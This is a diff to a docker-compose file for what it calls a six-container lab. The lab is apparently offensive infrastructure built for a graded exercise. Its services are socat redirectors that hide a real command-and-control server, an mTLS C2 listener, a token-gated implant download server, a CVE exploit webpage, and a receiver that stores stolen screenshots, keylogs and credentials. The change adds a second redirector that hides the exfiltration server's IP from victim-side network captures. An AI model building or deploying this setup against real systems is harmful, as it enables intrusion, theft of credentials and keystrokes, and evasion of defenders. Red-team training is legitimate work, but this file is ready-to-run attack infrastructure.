@@ -1,18 +1,20 @@
 # docker-compose.yml
-# Five-container lab — each service mimics a separate piece of infrastructure:
+# Six-container lab — each service mimics a separate piece of infrastructure:
 #
-#   "Machine 1" redirector     :443   socat relay — victim-facing, hides real C2 IP
-#   "Machine 2" c2-server      :443   mTLS C2 — backnet only, unreachable from victim
-#   "Machine 3" delivery-server:8443  nginx implant download — single-use token
-#   "Machine 4" exploit-server :8888  CVE exploit webpage — Node.js static server
-#   "Machine 5" exfil-receiver :9443  HTTPS POST receiver — stores exfil data from implant
+#   "Machine 1" c2-redirector        :443   socat relay — victim-facing, hides real C2 IP
+#   "Machine 2" c2-server         :443   mTLS C2 — backnet only, unreachable from victim
+#   "Machine 3" delivery-server   :8443  nginx implant download — single-use token
+#   "Machine 4" exploit-server    :8888  CVE exploit webpage — Node.js static server
+#   "Machine 5" exfil-redirector  :9443  socat relay — victim-facing, hides real exfil IP
+#   "Machine 6" exfil-receiver    :9443  HTTPS POST receiver — stores exfil data from implant
 #
 # C2 channel  (port 443,  mTLS)  : commands only — no bulk data
 # Exfil channel (port 9443, HTTPS): data uploads only — screenshots, keylogs, creds
 #
 # Network topology:
-#   frontnet  (victim-facing)  : redirector, delivery-server, exploit-server, exfil-receiver
-#   backnet   (internal only)  : redirector, c2-server
+#   frontnet  (victim-facing)  : c2-redirector, delivery-server, exploit-server, exfil-redirector
+#   backnet   (internal only)  : c2-redirector, c2-server
+#   exfilnet  (internal only)  : exfil-redirector, exfil-receiver
 #
 # Usage:
 #   docker compose up --build        (build and start all)
@@ -26,15 +28,15 @@ services:
   # Dumb pipe: forwards raw TCP bytes from victim:443 → c2-server:443.
   # Because it does not terminate TLS, the full mTLS handshake passes
   # through unchanged — no certificate modifications required.
-  redirector:
+  c2-redirector:
     image: alpine:latest
-    container_name: redirector
-    hostname: redirector
+    container_name: c2-redirector
+    hostname: c2-redirector
     command: >
       sh -c "apk add --no-cache socat > /dev/null 2>&1 &&
              exec socat TCP-LISTEN:443,fork,reuseaddr TCP:c2-server:443"
     ports:
-      - "${C2_HOST_IP}:443:443"  # Bind only to redirector IP alias — not the real C2 machine IP
+      - "${C2_HOST_IP}:443:443"  # Bind only to c2-redirector IP alias — not the real C2 machine IP
     networks:
       - frontnet
       - backnet
@@ -43,7 +45,7 @@ services:
     restart: unless-stopped
 
   # ── "Machine 2" C2 Server (mTLS listener) ─────────────────────────────
-  # No host port mapping — reachable only via redirector on backnet.
+  # No host port mapping — reachable only via c2-redirector on backnet.
   # Handles C2 commands only — exfil data goes directly to exfil-receiver.
   c2-server:
     build:
@@ -74,12 +76,13 @@ services:
       target: delivery-runtime
       args:
         - C2_HOST_IP=${C2_HOST_IP}
+        - EXFIL_HOST_IP=${EXFIL_HOST_IP}
         - ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
         - DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}
     container_name: delivery-server
     hostname: delivery-server
     ports:
-      - "${C2_HOST_IP}:8443:443"   # nginx HTTPS implant delivery — bound to redirector IP only
+      - "${C2_HOST_IP}:8443:443"   # nginx HTTPS implant delivery — bound to c2-redirector IP only
     environment:
       - DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}
     networks:
@@ -101,33 +104,53 @@ services:
     container_name: exploit-server
     hostname: exploit-server
     ports:
-      - "${C2_HOST_IP}:8888:8888"  # CVE exploit webpage — bound to redirector IP only
+      - "${C2_HOST_IP}:8888:8888"  # CVE exploit webpage — bound to c2-redirector IP only
     networks:
       - frontnet
     restart: unless-stopped
 
-  # ── "Machine 5" Exfil Receiver (HTTPS POST data sink) ─────────────────
-  # Receives exfil data (screenshots, keylogs, creds, history) directly from
-  # the implant via HTTPS POST on port 9443 — completely separate from the
-  # C2 command channel on port 443.  Satisfies the rubric requirement that
-  # C2 traffic and exfil traffic use different channels.
+  # ── "Machine 5" Exfil Redirector (socat TCP relay) ────────────────────
+  # Dumb pipe: forwards raw TCP bytes from victim:9443 → exfil-receiver:9443.
+  # Mirrors the C2 c2-redirector pattern — TLS passes through unchanged so the
+  # real exfil-receiver IP never appears in victim-side network captures.
+  exfil-redirector:
+    image: alpine:latest
+    container_name: exfil-redirector
+    hostname: exfil-redirector
+    command: >
+      sh -c "apk add --no-cache socat > /dev/null 2>&1 &&
+             exec socat TCP-LISTEN:9443,fork,reuseaddr TCP:exfil-receiver:9443"
+    ports:
+      - "${EXFIL_HOST_IP}:9443:9443"  # Bind only to exfil redirector IP alias — separate from C2 IP
+    networks:
+      - frontnet
+      - exfilnet
+    depends_on:
+      - exfil-receiver
+    restart: unless-stopped
+
+  # ── "Machine 6" Exfil Receiver (HTTPS POST data sink) ─────────────────
+  # Receives exfil data (screenshots, keylogs, creds, history) from the
+  # implant via HTTPS POST on port 9443 — completely separate from the
+  # C2 command channel on port 443.  No host port — reachable only via
+  # exfil-redirector on exfilnet.
   exfil-receiver:
     build:
       context: .
       dockerfile: exfil-receiver/Dockerfile
     container_name: exfil-receiver
     hostname: exfil-receiver
-    ports:
-      - "${C2_HOST_IP}:9443:9443"  # HTTPS exfil upload endpoint — bound to redirector IP only
     volumes:
       - ./exfil-data:/opt/exfil
     networks:
-      - frontnet
+      - exfilnet
     restart: unless-stopped
 
 # ── Networks ──────────────────────────────────────────────────────────────
 networks:
   frontnet:
-    driver: bridge   # Victim-facing: redirector, delivery-server, exploit-server, exfil-receiver
+    driver: bridge   # Victim-facing: c2-redirector, delivery-server, exploit-server, exfil-redirector
   backnet:
-    driver: bridge   # Internal only: redirector + c2-server
+    driver: bridge   # Internal only: c2-redirector + c2-server
+  exfilnet:
+    driver: bridge   # Internal only: exfil-redirector + exfil-receiver
